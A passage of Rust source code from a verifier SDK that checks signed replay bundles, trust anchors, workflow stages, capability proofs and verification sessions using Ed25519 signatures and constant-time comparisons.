    /// assert_eq!(sdk.sdk_version, SDK_VERSION);
    /// ```
    pub fn new(verifier_identity: impl Into<String>) -> Self {
        let mut config = BTreeMap::new();
        config.insert("schema_version".to_string(), SDK_VERSION.to_string());
        config.insert(
            "security_posture".to_string(),
            CRYPTOGRAPHIC_SECURITY_POSTURE.to_string(),
        );
        let signing_key = default_signing_key();
        let verifying_key = VerifyingKey::from(&signing_key);
        Self {
            verifier_identity: verifier_identity.into(),
            sdk_version: SDK_VERSION.to_string(),
            config,
            result_origin_nonce: default_result_origin_nonce(),
            signing_key,
            verifying_key,
        }
    }

    /// Verify a claim capsule through the existing capsule replay verifier.
    ///
    /// # Examples
    ///
    /// ```rust
    /// # #[cfg(feature = "test-support")] {
    /// use frankenengine_verifier_sdk::{VerifierSdk, VerificationVerdict};
    /// use frankenengine_verifier_sdk::capsule::build_reference_capsule;
    /// use ed25519_dalek::{SigningKey, VerifyingKey};
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// let signing_key = SigningKey::from_bytes(&[1_u8; 32]);
    /// let verifying_key = VerifyingKey::from(&signing_key);
    /// let result = sdk.verify_claim(&verifying_key, &build_reference_capsule())?;
    /// assert_eq!(result.verdict, VerificationVerdict::Pass);
    /// # }
    /// # Ok::<(), frankenengine_verifier_sdk::VerifierSdkError>(())
    /// ```
    pub fn verify_claim(
        &self,
        verifying_key: &VerifyingKey,
        claim: &capsule::ReplayCapsule,
    ) -> VerifierSdkResult<VerificationResult> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let replay = capsule::replay(verifying_key, claim, &self.verifier_identity)?;
        let verdict = VerificationVerdict::from(replay.verdict);
        let assertions = vec![
            AssertionResult {
                assertion: "capsule_replay_verified".to_string(),
                passed: verdict == VerificationVerdict::Pass,
                detail: replay.detail.clone(),
            },
            AssertionResult {
                assertion: "capsule_signature_verified".to_string(),
                passed: true,
                detail: "capsule Ed25519 signature matched".to_string(),
            },
        ];
        self.build_result(
            VerificationOperation::Claim,
            verdict,
            assertions,
            replay.actual_hash,
        )
    }

    /// Verify a migration artifact as canonical replay bundle bytes.
    ///
    /// # Examples
    ///
    /// ```rust
    /// use frankenengine_verifier_sdk::VerifierSdk;
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// assert!(sdk.verify_migration_artifact(b"not-json").is_err());
    /// ```
    pub fn verify_migration_artifact(
        &self,
        artifact: &[u8],
    ) -> VerifierSdkResult<VerificationResult> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let verified = bundle::verify(artifact)?;
        self.verify_bundle_belongs_to_current_verifier(&verified)?;
        let equivalence = verify_migration_equivalence_capsule(&verified);
        let verdict = if equivalence.all_passed() {
            VerificationVerdict::Pass
        } else {
            VerificationVerdict::Fail
        };

        self.build_result(
            VerificationOperation::MigrationArtifact,
            verdict,
            equivalence.checked_assertions,
            equivalence.artifact_binding_hash,
        )
    }

    /// Verify trust-state bundle bytes against an expected trust anchor hash.
    ///
    /// # Examples
    ///
    /// ```rust
    /// use frankenengine_verifier_sdk::VerifierSdk;
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// assert!(sdk.verify_trust_state(b"not-json", "not-a-sha256").is_err());
    /// ```
    pub fn verify_trust_state(
        &self,
        state: &[u8],
        anchor_integrity_hash: &str,
    ) -> VerifierSdkResult<VerificationResult> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        if anchor_integrity_hash.trim().is_empty() {
            return Err(VerifierSdkError::EmptyTrustAnchor);
        }
        if !is_canonical_sha256_hex(anchor_integrity_hash) {
            return Err(VerifierSdkError::MalformedTrustAnchor {
                actual: anchor_integrity_hash.to_string(),
            });
        }

        let verified = bundle::verify(state)?;
        self.verify_bundle_belongs_to_current_verifier(&verified)?;
        if !constant_time_eq(anchor_integrity_hash, &verified.integrity_hash) {
            return Err(VerifierSdkError::TrustAnchorMismatch {
                expected: anchor_integrity_hash.to_string(),
                actual: verified.integrity_hash,
            });
        }

        self.build_result(
            VerificationOperation::TrustState,
            VerificationVerdict::Pass,
            vec![AssertionResult {
                assertion: "trust_state_verified".to_string(),
                passed: true,
                detail: format!(
                    "trust state cryptographically verified against anchor {} via bundle {}",
                    anchor_integrity_hash, verified.bundle_id
                ),
            }],
            verified.integrity_hash,
        )
    }

    /// Verify a long-term-validity proof as of a claimed verification time.
    ///
    /// This SDK-native LTV mode does not trust the producing runtime. It
    /// recomputes the artifact marker, checks the artifact's crypto suite at
    /// the claimed time, verifies MMR inclusion under the origin root, verifies
    /// the re-attestation prefix chain to the witnessed root, and verifies the
    /// independent threshold witness receipt before accepting anteriority.
    pub fn verify_as_of_ltv(
        &self,
        evidence: &LongTermVerificationEvidence,
    ) -> VerifierSdkResult<VerificationResult> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let verification = verify_long_term_evidence(evidence);
        let verdict = if verification.all_passed() {
            VerificationVerdict::Pass
        } else {
            VerificationVerdict::Fail
        };

        self.build_result(
            VerificationOperation::LongTermValidation,
            verdict,
            verification.checked_assertions,
            verification.artifact_binding_hash,
        )
    }

    /// Verify a signed migration artifact with Ed25519 cryptographic verification.
    ///
    /// # Examples
    ///
    /// ```rust,ignore
    /// use frankenengine_verifier_sdk::VerifierSdk;
    /// use ed25519_dalek::VerifyingKey;
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// let public_key = VerifyingKey::from_bytes(&[0u8; 32]).unwrap();
    /// let signature_bytes = [0u8; 64];
    /// let result = sdk.verify_signed_migration_artifact(&public_key, b"bundle-bytes", &signature_bytes)?;
    /// ```
    pub fn verify_signed_migration_artifact(
        &self,
        verifying_key: &VerifyingKey,
        artifact: &[u8],
        signature_bytes: &[u8],
    ) -> VerifierSdkResult<VerificationResult> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;

        // First do structural validation
        let verified = bundle::verify(artifact)?;
        self.verify_bundle_belongs_to_current_verifier(&verified)?;

        // Then do cryptographic Ed25519 signature verification
        bundle::verify_signed_bundle(verifying_key, &verified, signature_bytes)?;

        // Success: bundle is both structurally valid and cryptographically signed
        let assertions = vec![
            AssertionResult {
                assertion: "migration_artifact_structural_verified".to_string(),
                passed: true,
                detail: "bundle structure and integrity validated".to_string(),
            },
            AssertionResult {
                assertion: "migration_artifact_signature_verified".to_string(),
                passed: true,
                detail: "Ed25519 signature verification passed".to_string(),
            },
        ];

        self.build_result(
            VerificationOperation::MigrationArtifact,
            VerificationVerdict::Pass,
            assertions,
            verified.integrity_hash,
        )
    }

    /// Verify a signed trust state bundle with Ed25519 cryptographic verification.
    ///
    /// # Examples
    ///
    /// ```rust,ignore
    /// use frankenengine_verifier_sdk::VerifierSdk;
    /// use ed25519_dalek::VerifyingKey;
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// let public_key = VerifyingKey::from_bytes(&[0u8; 32]).unwrap();
    /// let signature_bytes = [0u8; 64];
    /// let result = sdk.verify_signed_trust_state(&public_key, b"bundle-bytes", &signature_bytes, "anchor-hash")?;
    /// ```
    pub fn verify_signed_trust_state(
        &self,
        verifying_key: &VerifyingKey,
        state: &[u8],
        signature_bytes: &[u8],
        anchor_integrity_hash: &str,
    ) -> VerifierSdkResult<VerificationResult> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;

        // Validate trust anchor format (fail-closed)
        if anchor_integrity_hash.trim().is_empty() {
            return Err(VerifierSdkError::EmptyTrustAnchor);
        }
        if !is_canonical_sha256_hex(anchor_integrity_hash) {
            return Err(VerifierSdkError::MalformedTrustAnchor {
                actual: anchor_integrity_hash.to_string(),
            });
        }

        // Do structural validation
        let verified = bundle::verify(state)?;
        self.verify_bundle_belongs_to_current_verifier(&verified)?;

        // Verify trust anchor matches (constant-time comparison)
        if !constant_time_eq(anchor_integrity_hash, &verified.integrity_hash) {
            return Err(VerifierSdkError::TrustAnchorMismatch {
                expected: anchor_integrity_hash.to_string(),
                actual: verified.integrity_hash,
            });
        }

        // Do cryptographic Ed25519 signature verification
        bundle::verify_signed_bundle(verifying_key, &verified, signature_bytes)?;

        // Success: bundle is structurally valid, anchor matches, and cryptographically signed
        let assertions = vec![
            AssertionResult {
                assertion: "trust_state_structural_verified".to_string(),
                passed: true,
                detail: "bundle structure and integrity validated".to_string(),
            },
            AssertionResult {
                assertion: "trust_anchor_verified".to_string(),
                passed: true,
                detail: format!(
                    "trust anchor {} matches bundle integrity",
                    anchor_integrity_hash
                ),
            },
            AssertionResult {
                assertion: "trust_state_signature_verified".to_string(),
                passed: true,
                detail: "Ed25519 signature verification passed".to_string(),
            },
        ];

        self.build_result(
            VerificationOperation::TrustState,
            VerificationVerdict::Pass,
            assertions,
            verified.integrity_hash,
        )
    }

    /// Verify workflow execution with multi-stage signature validation.
    ///
    /// # Examples
    ///
    /// ```rust,ignore
    /// use frankenengine_verifier_sdk::VerifierSdk;
    /// use ed25519_dalek::VerifyingKey;
    /// use std::collections::HashMap;
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// let workflow_stages = HashMap::new(); // stage_name -> (bundle_bytes, verifying_key, signature_bytes)
    /// let result = sdk.verify_workflow_execution("workflow-001", &workflow_stages)?;
    /// ```
    pub fn verify_workflow_execution(
        &self,
        workflow_id: &str,
        stages: &BTreeMap<String, (Vec<u8>, VerifyingKey, Vec<u8>)>, // (bundle, key, signature)
    ) -> VerifierSdkResult<VerificationResult> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;

        if workflow_id.trim().is_empty() {
            return Err(VerifierSdkError::EmptyWorkflowId);
        }

        if stages.is_empty() {
            return Err(VerifierSdkError::EmptyWorkflowStages);
        }

        let mut assertions = Vec::new();
        let mut all_integrity_hashes: Vec<String> = Vec::new();

        // Verify each workflow stage
        for (stage_name, (bundle_bytes, verifying_key, signature_bytes)) in stages {
            // Structural validation
            let verified = bundle::verify(bundle_bytes).map_err(|e| {
                VerifierSdkError::WorkflowStageValidationFailed {
                    stage: stage_name.clone(),
                    reason: format!("structural validation failed: {}", e),
                }
            })?;

            self.verify_bundle_belongs_to_current_verifier(&verified)
                .map_err(|e| VerifierSdkError::WorkflowStageValidationFailed {
                    stage: stage_name.clone(),
                    reason: format!("verifier identity check failed: {}", e),
                })?;

            // Cryptographic verification
            bundle::verify_signed_bundle(verifying_key, &verified, signature_bytes).map_err(
                |e| VerifierSdkError::WorkflowStageValidationFailed {
                    stage: stage_name.clone(),
                    reason: format!("signature verification failed: {}", e),
                },
            )?;

            all_integrity_hashes.push(verified.integrity_hash.clone());

            assertions.push(AssertionResult {
                assertion: format!("workflow_stage_{}_verified", stage_name),
                passed: true,
                detail: format!(
                    "stage {} structurally valid and cryptographically signed",
                    stage_name
                ),
            });
        }

        // Compute workflow integrity hash from all stage hashes
        let mut hasher = sha2::Sha256::new();
        hasher.update(b"frankenengine-verifier-sdk:workflow-integrity:v1:");
        hasher.update(workflow_id.as_bytes());
        for hash in &all_integrity_hashes {
            hasher.update(hash.as_bytes());
        }
        let workflow_integrity_hash = hex::encode(hasher.finalize());

        assertions.push(AssertionResult {
            assertion: "workflow_execution_verified".to_string(),
            passed: true,
            detail: format!(
                "workflow {} with {} stages verified",
                workflow_id,
                stages.len()
            ),
        });

        self.build_result(
            VerificationOperation::WorkflowExecution,
            VerificationVerdict::Pass,
            assertions,
            workflow_integrity_hash,
        )
    }

    /// Validate canonical replay bundle bytes without producing a facade result.
    ///
    /// # Examples
    ///
    /// ```rust
    /// use frankenengine_verifier_sdk::VerifierSdk;
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// assert!(sdk.validate_bundle(b"not-json").is_err());
    /// ```
    pub fn validate_bundle(&self, bundle: &[u8]) -> VerifierSdkResult<()> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let max_bytes = self.resolved_max_bundle_size_bytes();
        if bundle.len() > max_bytes {
            return Err(VerifierSdkError::BundleTooLarge {
                actual_bytes: bundle.len(),
                max_bytes,
            });
        }
        let verified = bundle::verify(bundle)?;
        self.verify_bundle_belongs_to_current_verifier(&verified)?;
        Ok(())
    }

    /// Verify an effect-chain-bearing replay bundle offline.
    ///
    /// This validates canonical bundle structure, SDK/schema versions,
    /// verifier identity, each embedded effect receipt's hash-chain linkage,
    /// and every receipt hash reference against CAS bytes carried in the
    /// bundle artifacts.
    pub fn verify_effect_chain_bundle(
        &self,
        bundle_bytes: &[u8],
    ) -> VerifierSdkResult<bundle::EffectChainVerification> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let max_bytes = self.resolved_max_bundle_size_bytes();
        if bundle_bytes.len() > max_bytes {
            return Err(VerifierSdkError::BundleTooLarge {
                actual_bytes: bundle_bytes.len(),
                max_bytes,
            });
        }
        let report = bundle::verify_effect_chain(bundle_bytes)?;
        if !constant_time_eq(&report.verifier_identity, &self.verifier_identity) {
            return Err(VerifierSdkError::SessionVerifierMismatch {
                expected: self.verifier_identity.clone(),
                actual: report.verifier_identity,
            });
        }
        Ok(report)
    }

    /// Re-derive and verify a bare effect-receipt chain offline from its entries
    /// alone — e.g. the host-effect ledger surfaced in `franken-node run --json`.
    ///
    /// Unlike [`verify_effect_chain_bundle`], this needs no surrounding replay
    /// bundle and no embedded verifier identity: it independently re-derives
    /// each entry's index, prev/chain-hash linkage, and receipt hash and fails
    /// closed on any mismatch. CAS byte-bindings are not checked (the bare
    /// ledger carries only content hashes); export a replay bundle and use
    /// [`verify_effect_chain_bundle`] when byte-binding proof is required.
    pub fn verify_effect_chain_entries(
        &self,
        entries: &[bundle::EffectReceiptChainEntry],
    ) -> VerifierSdkResult<bundle::EffectChainVerification> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let report = bundle::verify_effect_chain_entries(entries)?;
        Ok(report)
    }

    /// Verify a selective-disclosure non-exfiltration claim over a replay bundle.
    pub fn verify_non_exfiltration_claim_bundle(
        &self,
        bundle_bytes: &[u8],
        claim: &bundle::NonExfiltrationClaim,
    ) -> VerifierSdkResult<bundle::NonExfiltrationVerification> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let max_bytes = self.resolved_max_bundle_size_bytes();
        if bundle_bytes.len() > max_bytes {
            return Err(VerifierSdkError::BundleTooLarge {
                actual_bytes: bundle_bytes.len(),
                max_bytes,
            });
        }
        let proof = bundle::verify_non_exfiltration_claim(bundle_bytes, claim)?;
        if !constant_time_eq(&proof.verifier_identity, &self.verifier_identity) {
            return Err(VerifierSdkError::SessionVerifierMismatch {
                expected: self.verifier_identity.clone(),
                actual: proof.verifier_identity,
            });
        }
        Ok(proof)
    }

    /// Verify a proof-carrying capability grant offline.
    pub fn verify_capability_proof(
        &self,
        proof: &bundle::CapabilityProof,
    ) -> VerifierSdkResult<String> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let proof_hash = bundle::verify_capability_proof_schema(proof)?;
        self.verify_capability_audience(&proof.audience)?;
        Ok(proof_hash)
    }

    /// Verify a capability-use receipt against the supplied proof.
    pub fn verify_capability_receipt(
        &self,
        proof: &bundle::CapabilityProof,
        receipt: &bundle::CapabilityReceipt,
    ) -> VerifierSdkResult<bundle::CapabilityReceiptVerification> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let report = bundle::verify_capability_receipt_schema(proof, receipt)?;
        self.verify_capability_audience(&report.audience)?;
        Ok(report)
    }

    /// Replay an allow/deny capability decision without producer-runtime access.
    pub fn validate_counterfactual_capability_decision(
        &self,
        proof: &bundle::CapabilityProof,
        request: &counterfactual::CounterfactualCapabilityRequest,
        decision: counterfactual::CounterfactualCapabilityDecision,
    ) -> VerifierSdkResult<counterfactual::CounterfactualCapabilityValidation> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        self.verify_capability_audience(&proof.audience)?;
        let validation =
            counterfactual::validate_counterfactual_capability_decision(proof, request, decision)?;
        self.verify_capability_audience(&validation.audience)?;
        Ok(validation)
    }

    /// Verify a signed trust-native module-resolution receipt offline.
    pub fn verify_resolution_receipt(
        &self,
        verifying_key: &VerifyingKey,
        receipt_bytes: &[u8],
    ) -> VerifierSdkResult<resolution::VerifiedResolutionReceipt> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let max_bytes = self.resolved_max_bundle_size_bytes();
        if receipt_bytes.len() > max_bytes {
            return Err(VerifierSdkError::BundleTooLarge {
                actual_bytes: receipt_bytes.len(),
                max_bytes,
            });
        }
        resolution::verify_signed_resolution_receipt(verifying_key, receipt_bytes)
            .map_err(VerifierSdkError::from)
    }

    /// Resolve the active bundle size cap for this SDK instance.
    ///
    /// Reads [`VERIFIER_SDK_MAX_BUNDLE_SIZE_BYTES_CONFIG_KEY`] from
    /// [`VerifierSdk::config`], parses it as a `usize`, clamps the result down to
    /// [`ABSOLUTE_MAX_BUNDLE_SIZE_BYTES`], and falls back to
    /// [`DEFAULT_MAX_BUNDLE_SIZE_BYTES`] for missing or unparseable values. A zero
    /// override is honored as "reject every bundle" rather than promoted to the
    /// default — that preserves the operator's ability to fail closed.
    fn resolved_max_bundle_size_bytes(&self) -> usize {
        match self
            .config
            .get(VERIFIER_SDK_MAX_BUNDLE_SIZE_BYTES_CONFIG_KEY)
            .and_then(|raw| raw.parse::<usize>().ok())
        {
            Some(configured) => configured.min(ABSOLUTE_MAX_BUNDLE_SIZE_BYTES),
            None => DEFAULT_MAX_BUNDLE_SIZE_BYTES,
        }
    }

    /// Append a signed facade result to an in-memory transparency log.
    ///
    /// # Examples
    ///
    /// ```rust
    /// # #[cfg(feature = "test-support")] {
    /// use frankenengine_verifier_sdk::VerifierSdk;
    /// use frankenengine_verifier_sdk::capsule::build_reference_capsule;
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// let result = sdk.verify_claim(&build_reference_capsule())?;
    /// let mut log = Vec::new();
    /// let entry = sdk.append_transparency_log(&mut log, &result)?;
    /// assert_eq!(log, vec![entry]);
    /// # }
    /// # Ok::<(), frankenengine_verifier_sdk::VerifierSdkError>(())
    /// ```
    pub fn append_transparency_log(
        &self,
        log: &mut Vec<TransparencyLogEntry>,
        result: &VerificationResult,
    ) -> VerifierSdkResult<TransparencyLogEntry> {
        self.validate_current_verifier_identity()?;
        self.verify_result_belongs_to_current_verifier(result)?;
        ensure_bounded_capacity(log.len(), MAX_TRANSPARENCY_LOG_ENTRIES, "transparency_log")?;
        validate_transparency_log_history(log)?;
        let result_hash = transparency_log_leaf_hash(result)?;
        let mut leaf_hashes: Vec<String> =
            log.iter().map(|entry| entry.result_hash.clone()).collect();
        push_bounded(
            &mut leaf_hashes,
            result_hash.clone(),
            MAX_TRANSPARENCY_LOG_ENTRIES,
            "transparency_log_leaf_hashes",
        )?;
        let entry = TransparencyLogEntry {
            result_hash: result_hash.clone(),
            timestamp: current_utc_timestamp(),
            verifier_id: result.verifier_identity.clone(),
            merkle_proof: transparency_merkle_proof(&leaf_hashes, leaf_hashes.len() - 1),
        };
        push_bounded(
            log,
            entry.clone(),
            MAX_TRANSPARENCY_LOG_ENTRIES,
            "transparency_log",
        )?;
        Ok(entry)
    }

    /// Execute a documented validation workflow against canonical replay bundle bytes.
    ///
    /// # Examples
    ///
    /// ```rust
    /// use frankenengine_verifier_sdk::{ValidationWorkflow, VerifierSdk};
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// assert!(
    ///     sdk.execute_workflow(ValidationWorkflow::ComplianceAudit, b"not-json")
    ///         .is_err()
    /// );
    /// ```
    pub fn execute_workflow(
        &self,
        workflow: ValidationWorkflow,
        bundle: &[u8],
    ) -> VerifierSdkResult<VerificationResult> {
        check_sdk_version(&self.sdk_version).map_err(VerifierSdkError::UnsupportedSdk)?;
        self.validate_current_verifier_identity()?;
        let verified = bundle::verify(bundle)?;
        self.verify_bundle_belongs_to_current_verifier(&verified)?;

        let workflow_name = match workflow {
            ValidationWorkflow::ReleaseValidation => "release_validation",
            ValidationWorkflow::IncidentValidation => "incident_validation",
            ValidationWorkflow::ComplianceAudit => "compliance_audit",
        };

        self.build_result(
            VerificationOperation::Workflow,
            VerificationVerdict::Pass,
            vec![AssertionResult {
                assertion: format!("{}_workflow_executed", workflow_name),
                passed: true,
                detail: format!(
                    "workflow {} cryptographically verified from bundle {}",
                    workflow_name, verified.bundle_id
                ),
            }],
            verified.integrity_hash,
        )
    }

    /// Create a new unsealed verification session.
    ///
    /// # Examples
    ///
    /// ```rust
    /// use frankenengine_verifier_sdk::VerifierSdk;
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// let session = sdk.create_session("session-docs")?;
    /// assert!(!session.sealed);
    /// # Ok::<(), frankenengine_verifier_sdk::VerifierSdkError>(())
    /// ```
    pub fn create_session(
        &self,
        session_id: impl Into<String>,
    ) -> VerifierSdkResult<VerificationSession> {
        self.validate_current_verifier_identity()?;
        let session_id = session_id.into();
        validate_session_id(&session_id)?;
        let created_at = current_utc_timestamp();
        let session_nonce = derive_session_nonce(
            &session_id,
            &self.verifier_identity,
            &created_at,
            next_session_nonce_counter()?,
        );
        Ok(VerificationSession {
            session_id: session_id.clone(),
            verifier_identity: self.verifier_identity.clone(),
            created_at: created_at.clone(),
            steps: Vec::new(),
            sealed: false,
            final_verdict: None,
            origin_session_id: session_id.clone(),
            origin_verifier_identity: self.verifier_identity.clone(),
            origin_created_at: created_at.clone(),
            origin_session_nonce: session_nonce.clone(),
            session_nonce,
        })
    }

    /// Append a verification result as the next session step.
    ///
    /// # Examples
    ///
    /// ```rust
    /// # #[cfg(feature = "test-support")] {
    /// use frankenengine_verifier_sdk::VerifierSdk;
    /// use frankenengine_verifier_sdk::capsule::build_reference_capsule;
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// let result = sdk.verify_claim(&build_reference_capsule())?;
    /// let mut session = sdk.create_session("session-docs")?;
    /// let step = sdk.record_session_step(&mut session, &result)?;
    /// assert_eq!(step.step_index, 0);
    /// # }
    /// # Ok::<(), frankenengine_verifier_sdk::VerifierSdkError>(())
    /// ```
    pub fn record_session_step(
        &self,
        session: &mut VerificationSession,
        result: &VerificationResult,
    ) -> VerifierSdkResult<SessionStep> {
        self.validate_current_verifier_identity()?;
        validate_session_provenance(session)?;
        if session.sealed {
            return Err(VerifierSdkError::SessionSealed(session.session_id.clone()));
        }
        self.verify_result_belongs_to_current_verifier(result)?;
        if !constant_time_eq(&session.origin_verifier_identity, &self.verifier_identity) {
            return Err(VerifierSdkError::SessionVerifierMismatch {
                expected: session.origin_verifier_identity.clone(),
                actual: self.verifier_identity.clone(),
            });
        }
        if !constant_time_eq(&result.verifier_identity, &session.origin_verifier_identity) {
            return Err(VerifierSdkError::SessionVerifierMismatch {
                expected: session.origin_verifier_identity.clone(),
                actual: result.verifier_identity.clone(),
            });
        }
        ensure_bounded_capacity(
            session.steps.len(),
            MAX_VERIFICATION_SESSION_STEPS,
            "verification_session_steps",
        )?;
        let step = SessionStep {
            step_index: session.steps.len(),
            operation: result.operation.clone(),
            verdict: result.verdict.clone(),
            artifact_binding_hash: result.artifact_binding_hash.clone(),
            timestamp: current_utc_timestamp(),
            step_signature: String::new(),
        };
        let step = SessionStep {
            step_signature: session_step_signature(session, &step)?,
            ..step
        };
        push_bounded(
            &mut session.steps,
            step.clone(),
            MAX_VERIFICATION_SESSION_STEPS,
            "verification_session_steps",
        )?;
        Ok(step)
    }

    /// Seal a verification session and compute its final verdict.
    ///
    /// # Examples
    ///
    /// ```rust
    /// use frankenengine_verifier_sdk::{VerificationVerdict, VerifierSdk};
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// let mut session = sdk.create_session("session-docs")?;
    /// let verdict = sdk.seal_session(&mut session)?;
    /// assert_eq!(verdict, VerificationVerdict::Inconclusive);
    /// assert!(session.sealed);
    /// # Ok::<(), frankenengine_verifier_sdk::VerifierSdkError>(())
    /// ```
    pub fn seal_session(
        &self,
        session: &mut VerificationSession,
    ) -> VerifierSdkResult<VerificationVerdict> {
        self.validate_current_verifier_identity()?;
        validate_session_provenance(session)?;
        if session.sealed {
            return Err(VerifierSdkError::SessionSealed(session.session_id.clone()));
        }
        if !constant_time_eq(&session.origin_verifier_identity, &self.verifier_identity) {
            return Err(VerifierSdkError::SessionVerifierMismatch {
                expected: self.verifier_identity.clone(),
                actual: session.origin_verifier_identity.clone(),
            });
        }
        for (expected_index, step) in session.steps.iter().enumerate() {
            if step.step_index != expected_index {
                return Err(VerifierSdkError::SessionStepSequenceMismatch {
                    expected: expected_index,
                    actual: step.step_index,
                });
            }
            let expected_signature = session_step_signature(session, step)?;
            if !constant_time_eq(&step.step_signature, &expected_signature) {
                return Err(VerifierSdkError::SessionStepSignatureMismatch {
                    step_index: step.step_index,
                    actual: step.step_signature.clone(),
                });
            }
        }
        let verdict = if session.steps.is_empty() {
            VerificationVerdict::Inconclusive
        } else if session
            .steps
            .iter()
            .all(|step| step.verdict == VerificationVerdict::Pass)
        {
            VerificationVerdict::Pass
        } else {
            VerificationVerdict::Fail
        };
        session.sealed = true;
        session.final_verdict = Some(verdict.clone());
        Ok(verdict)
    }

    fn verify_result_signature(&self, result: &VerificationResult) -> Result<(), VerifierSdkError> {
        // Create the same payload that was signed
        #[derive(Serialize)]
        struct SignatureView<'a> {
            operation: &'a VerificationOperation,
            verdict: &'a VerificationVerdict,
            confidence_score: f64,
            checked_assertions: &'a [AssertionResult],
            execution_timestamp: &'a str,
            verifier_identity: &'a str,
            artifact_binding_hash: &'a str,
            sdk_version: &'a str,
            result_origin_nonce: &'a str,
        }

        let payload = serde_json::to_vec(&SignatureView {
            operation: &result.operation,
            verdict: &result.verdict,
            confidence_score: result.confidence_score,
            checked_assertions: &result.checked_assertions,
            execution_timestamp: &result.execution_timestamp,
            verifier_identity: &result.verifier_identity,
            artifact_binding_hash: &result.artifact_binding_hash,
            sdk_version: &result.sdk_version,
            result_origin_nonce: &result.result_origin_nonce,
        })
        .map_err(|source| VerifierSdkError::Json(source.to_string()))?;

        // Decode the signature from hex
        let signature_bytes = hex::decode(&result.verifier_signature).map_err(|_| {
            VerifierSdkError::ResultSignatureMismatch {
                expected: "valid hex signature".to_string(),
                actual: result.verifier_signature.clone(),
            }
        })?;

        if signature_bytes.len() != 64 {
            return Err(VerifierSdkError::ResultSignatureMismatch {
                expected: "64-byte signature".to_string(),
                actual: format!("{}-byte signature", signature_bytes.len()),
            });
        }

        let mut signature_array = [0_u8; 64];
        signature_array.copy_from_slice(&signature_bytes);
        let signature = ed25519_dalek::Signature::from_bytes(&signature_array);

        // Verify the Ed25519 signature
        self.verifying_key
            .verify_strict(&payload, &signature)
            .map_err(|_| VerifierSdkError::ResultSignatureMismatch {
                expected: "valid Ed25519 signature".to_string(),
                actual: result.verifier_signature.clone(),
            })
    }

    fn verify_result_belongs_to_current_verifier(
        &self,
        result: &VerificationResult,
    ) -> Result<(), VerifierSdkError> {
        self.validate_current_verifier_identity()?;
        if !constant_time_eq(&result.result_origin_nonce, &self.result_origin_nonce) {
            // SECURITY: do not return the SDK's `result_origin_nonce` to the
            // caller — it is a per-instance secret (`#[serde(skip)]` on
            // `VerifierSdk`) and surfacing it as `expected=...` would let any
            // forged-result probe read the nonce out of one error and replay
            // it as a valid origin tag on the next attempt. Caller only sees
            // the value they themselves submitted, plus a generic mismatch
            // signal.
            return Err(VerifierSdkError::ResultOriginMismatch {
                actual: result.result_origin_nonce.clone(),
            });
        }
        self.verify_result_signature(result)?;
        if !constant_time_eq(&result.verifier_identity, &self.verifier_identity) {
            return Err(VerifierSdkError::SessionVerifierMismatch {
                expected: self.verifier_identity.clone(),
                actual: result.verifier_identity.clone(),
            });
        }
        Ok(())
    }

    fn verify_bundle_belongs_to_current_verifier(
        &self,
        bundle: &bundle::ReplayBundle,
    ) -> Result<(), VerifierSdkError> {
        self.validate_current_verifier_identity()?;
        if !constant_time_eq(&bundle.verifier_identity, &self.verifier_identity) {
            return Err(VerifierSdkError::SessionVerifierMismatch {
                expected: self.verifier_identity.clone(),
                actual: bundle.verifier_identity.clone(),
            });
        }
        Ok(())
    }

    fn verify_capability_audience(&self, audience: &str) -> Result<(), VerifierSdkError> {
        self.validate_current_verifier_identity()?;
        if !constant_time_eq(audience, &self.verifier_identity) {
            return Err(VerifierSdkError::SessionVerifierMismatch {
                expected: self.verifier_identity.clone(),
                actual: audience.to_string(),
            });
        }
        Ok(())
    }

    fn build_result(
        &self,
        operation: VerificationOperation,
        verdict: VerificationVerdict,
        checked_assertions: Vec<AssertionResult>,
        artifact_binding_hash: String,
    ) -> Result<VerificationResult, VerifierSdkError> {
        self.validate_current_verifier_identity()?;
        let confidence_score = confidence_score_for_result(&verdict, &checked_assertions);
        let mut result = VerificationResult {
            operation,
            verdict,
            confidence_score,
            checked_assertions,
            execution_timestamp: current_utc_timestamp(),
